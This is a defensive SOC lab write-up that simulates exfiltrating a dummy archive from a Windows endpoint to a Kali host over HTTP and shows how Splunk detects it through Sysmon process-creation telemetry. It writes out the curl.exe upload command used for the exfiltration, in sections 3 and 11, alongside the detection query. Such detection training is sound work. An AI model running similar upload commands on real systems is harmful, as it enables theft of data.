# UC-009 – HTTP Data Exfiltration

## 1. Overview

This use case simulates the exfiltration of previously collected and archived data from a Windows endpoint to an external host within the isolated SOC laboratory.

During UC-008, test data was collected and compressed into the following archive:

```text
C:\SOC-Lab\collection.zip
```

In this scenario, the archive was transferred from the Windows 11 workstation (`target-pc`) to the Kali Linux machine using the native Windows `curl.exe` utility over HTTP.

The objective is to demonstrate how a SOC analyst can identify potential data exfiltration by analyzing endpoint process telemetry in Splunk.

> **Lab Safety:** All files used in this scenario contain dummy test data. The transfer was performed exclusively inside the isolated SOC laboratory network.

---

## 2. Environment

| Component | Role | IP Address |
|---|---|---|
| Windows 11 `target-pc` | Source endpoint | `10.0.10.20` |
| Kali Linux | Receiving host | `10.0.10.250` |
| Ubuntu Server | Splunk Server | `10.0.10.10` |

### Data Flow

```text
target-pc
10.0.10.20
     |
     | HTTP
     | TCP/8000
     v
Kali Linux
10.0.10.250
```

---

## 3. Attack Scenario

The scenario assumes that data has already been collected and archived on the endpoint.

The archive used for the simulation was:

```text
C:\SOC-Lab\collection.zip
```

The transfer was performed using the native Windows utility:

```text
C:\Windows\System32\curl.exe
```

The destination was an HTTP service running on the Kali Linux machine:

```text
10.0.10.250:8000
```

The transfer command observed during the simulation was:

```powershell
curl.exe -T "C:\SOC-Lab\collection.zip" http://10.0.10.250:8000/
```

This generated endpoint telemetry that could subsequently be investigated from Splunk.

---

## 4. Execution Evidence

The archive was transferred from `target-pc` to the Kali Linux receiver.

### Windows Transfer

The following screenshot shows the execution of `curl.exe` from the Windows endpoint.

![HTTP transfer using curl](../../screenshots/detections/UC-009-curl-transfer.png)

### Kali Reception

The transferred archive was successfully received by the Kali Linux machine as:

```text
received_collection.zip
```

The reception was verified using:

```bash
ls -lh received_collection.zip
```

![Transferred archive received on Kali](../../screenshots/detections/UC-009-kali-received-file.png)

This confirms that the simulated data transfer was successfully completed between the two laboratory systems.

---

## 5. Splunk Detection

The investigation focused on Sysmon Process Creation events generated on `target-pc`.

The following Splunk query was used:

```spl
index=windows host="target-pc" EventCode=1 earliest=-1h Image="*\\curl.exe"
| table _time User Image ParentImage CommandLine
| sort -_time
```

The search returned a process creation event associated with:

```text
Process:
C:\Windows\System32\curl.exe

User:
BADR\Administrator

Parent Process:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Source File:
C:\SOC-Lab\collection.zip

Destination:
http://10.0.10.250:8000/
```

![Splunk detection of curl execution](../../screenshots/detections/UC-009-splunk-curl-event.png)

The command line is particularly important because it provides direct visibility into both the local file being transferred and the remote destination.

---

## 6. SOC Analysis – 5W1H

### Who?

The activity was executed under the following account:

```text
BADR\Administrator
```

This identifies the user context associated with the `curl.exe` process.

---

### What?

A ZIP archive containing the previously collected test data was transferred from the Windows endpoint to another system.

The transferred file was:

```text
C:\SOC-Lab\collection.zip
```

The process responsible for the transfer was:

```text
curl.exe
```

---

### When?

Splunk recorded the relevant Sysmon Process Creation event at approximately:

```text
2026-08-17 19:18:34
```

This timestamp can be used to correlate the transfer with preceding collection and archive activity.

---

### Where?

The activity originated from:

```text
Host: target-pc
IP: 10.0.10.20
```

The destination used in the command line was:

```text
10.0.10.250:8000
```

which corresponds to the Kali Linux system in the isolated SOC laboratory.

---

### Why?

From a SOC perspective, transferring an archive containing collected data to another host can represent data staging followed by potential exfiltration.

However, the execution of `curl.exe` is not automatically malicious. It is a legitimate Windows utility that may also be used for administrative or application-related network transfers.

The activity becomes suspicious when contextual evidence is considered together:

- an archive containing collected data already existed;
- `curl.exe` was launched from PowerShell;
- the command line explicitly referenced the archive;
- the command line contained a remote destination;
- the archive was subsequently observed on the receiving system.

Therefore, the event requires contextual investigation rather than classification based solely on the process name.

---

### How?

The transfer was performed using the native Windows `curl.exe` utility over HTTP.

The observed process chain was:

```text
powershell.exe
      |
      v
curl.exe
      |
      | HTTP transfer
      v
10.0.10.250:8000
```

Sysmon Event ID 1 recorded the process execution and command-line arguments, and the event was forwarded to Splunk for analysis.

---

## 7. Event Correlation

This use case is directly related to UC-008.

The complete behavioral sequence observed across both use cases is:

```text
Test data
    |
    v
C:\SOC-Lab\Collection
    |
    | UC-008
    v
tar.exe
    |
    v
C:\SOC-Lab\collection.zip
    |
    | UC-009
    v
curl.exe
    |
    | HTTP
    v
10.0.10.250:8000
    |
    v
received_collection.zip
```

Analyzing these activities together provides significantly more context than analyzing `tar.exe` or `curl.exe` independently.

A legitimate archive utility followed by a legitimate network transfer utility can become suspicious when both processes operate on the same collected dataset within a short period.

---

## 8. Analyst Interpretation

The execution of `curl.exe` alone is insufficient to classify the activity as malicious.

A SOC analyst should examine additional context such as:

- the user executing the process;
- the parent process;
- the complete command line;
- the file being accessed;
- the destination address;
- previous activity involving the same file;
- whether the destination is expected or authorized.

In this case, the command-line telemetry provided strong contextual evidence because it exposed:

```text
curl.exe
        ↓
C:\SOC-Lab\collection.zip
        ↓
HTTP
        ↓
10.0.10.250:8000
```

Combined with the archive creation activity observed during UC-008, this behavior represents a simulated data exfiltration chain inside the laboratory.

---

## 9. Telemetry Limitation

A search was also performed for Sysmon Network Connection events (`EventCode=3`) associated with `curl.exe` and the destination `10.0.10.250:8000`.

No corresponding Event ID 3 event was observed in Splunk during the investigation.

Therefore, this use case does **not** claim network detection through Sysmon Event ID 3.

The primary SIEM evidence used for the investigation was:

```text
Sysmon Event ID 1 – Process Creation
```

The process event still exposed the destination address and port because they were present directly in the `curl.exe` command line.

This represents an important monitoring lesson: detection capability depends on the telemetry that is actually available to the SIEM, and analysts should distinguish between observed evidence and expected telemetry.

---

## 10. MITRE ATT&CK Context

This scenario represents data being transferred from a compromised endpoint to another system using an application-layer network protocol.

The precise MITRE ATT&CK sub-technique should be selected according to the protocol and exfiltration behavior represented by the final scenario.

The laboratory demonstrates the general exfiltration phase through:

```text
Archive preparation
        ↓
Transfer utility execution
        ↓
HTTP communication
        ↓
Remote data reception
```

The ATT&CK mapping should therefore be interpreted together with the preceding archive activity documented in UC-008.

---

## 11. Detection Result

The simulated exfiltration activity was successfully identified in Splunk through Sysmon Process Creation telemetry.

### Key Evidence

| Field | Observed Value |
|---|---|
| Host | `target-pc` |
| User | `BADR\Administrator` |
| Process | `C:\Windows\System32\curl.exe` |
| Parent Process | `powershell.exe` |
| Source File | `C:\SOC-Lab\collection.zip` |
| Destination | `10.0.10.250` |
| Destination Port | `8000` |
| Protocol | HTTP |
| Sysmon Event | Event ID `1` |

The most valuable field during the investigation was the command line:

```text
"C:\WINDOWS\system32\curl.exe" -T C:\SOC-Lab\collection.zip http://10.0.10.250:8000/
```

It revealed the executable, transferred file, remote destination, port, and protocol within a single process event.

---

## 12. Key Learning

This use case demonstrates that data exfiltration detection should not depend exclusively on identifying a specific executable.

Legitimate utilities such as:

```text
curl.exe
powershell.exe
tar.exe
```

can be used during normal administrative operations.

The SOC analyst therefore needs to analyze the **behavior and context** surrounding their execution.

In this scenario, correlation between archive creation in UC-008 and the subsequent HTTP transfer in UC-009 provided stronger evidence than either event analyzed independently.

The investigation also demonstrated the importance of documenting telemetry limitations. Although a Sysmon Network Connection event was expected, it was not observed in Splunk. The analysis therefore relied only on evidence that was actually collected and verified.

---

## 13. Conclusion

UC-009 successfully demonstrated a controlled data exfiltration scenario inside the isolated SOC laboratory.

A previously created archive was transferred from the Windows endpoint to a Kali Linux receiver using `curl.exe` over HTTP.

Sysmon captured the execution through Event ID 1, and Splunk provided visibility into the process, user, parent process, source archive, and remote destination.

When correlated with UC-008, the activity forms a complete simulated sequence:

```text
Data Collection
      ↓
Archive Creation
      ↓
HTTP Transfer
      ↓
Remote Reception
```

This use case demonstrates how endpoint telemetry and contextual correlation can help a SOC analyst identify potentially suspicious data-transfer behavior while avoiding the assumption that legitimate administrative tools are inherently malicious.
